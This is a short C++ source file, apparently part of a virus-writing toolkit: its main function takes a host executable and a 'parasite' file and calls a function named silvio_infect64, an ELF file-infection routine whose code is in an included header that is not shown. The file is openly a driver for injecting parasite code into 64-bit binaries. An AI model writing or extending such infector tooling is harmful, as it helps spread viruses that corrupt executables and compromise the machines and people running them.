#include "infector/silvio.hh"
#include "std/stdio.hh"

// Usage %s <host> <parasite>
int main(int argc, char** argv) {
  if (argc != 3) {
    return EXIT_FAILURE;
  }

  if (vt::infector::silvio_infect64(argv[1], argv[2])) {
    return EXIT_SUCCESS;
  }
  return EXIT_FAILURE;
}